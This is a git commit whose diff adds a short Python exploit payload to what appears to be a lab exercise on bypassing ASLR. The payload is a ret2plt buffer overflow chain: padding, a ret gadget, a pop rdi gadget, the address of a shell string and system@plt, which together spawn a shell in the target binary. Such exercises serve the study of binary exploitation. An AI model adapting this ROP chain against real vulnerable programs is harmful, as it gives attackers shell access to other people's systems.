8798d340fb85948b4a75415778fefc2c926d24b1
violet-devsec <titto.tvm@hotmail.com>
2022-09-30 11:14:54 +0530

    aslr bypass: payload added

--- aslr-bypass/case-2/payload_ret2plt2.py
+++ aslr-bypass/case-2/payload_ret2plt2.py
@@ -5,3 +5,12 @@ pop_rdi_ret = 0x401283
 sh_address = 0x40204a
 system = 0x401064
 
+buf  = b'A' * 208
+buf += b'\x42' * 8
+
+buf += p64(ret)
+buf += p64(pop_rdi_ret)
+buf += p64(sh_address)
+buf += p64(system)
+
+sys.stdout.buffer.write(buf)
